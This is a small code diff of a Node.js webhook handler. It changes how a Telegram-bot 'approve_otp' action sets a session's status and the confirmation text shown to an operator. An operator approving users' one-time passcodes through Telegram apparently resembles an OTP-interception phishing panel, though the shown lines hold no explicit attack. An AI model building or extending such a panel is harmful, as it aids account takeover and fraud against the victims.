@@ -415,8 +415,8 @@ app.post('/webhook', async (req, res) => {
     }
 
     case 'approve_otp': {
-      session.status = 'continue';
-      await tgAnswerCallback(cbId, '✅ OTP approved');
+      session.status = 'approved_otp';
+      await tgAnswerCallback(cbId, '✅ OTP approved — user notified');
       await tgEditMessage(session.otpMsgId,
         `📟 <b>OTP — ✅ APPROVED</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
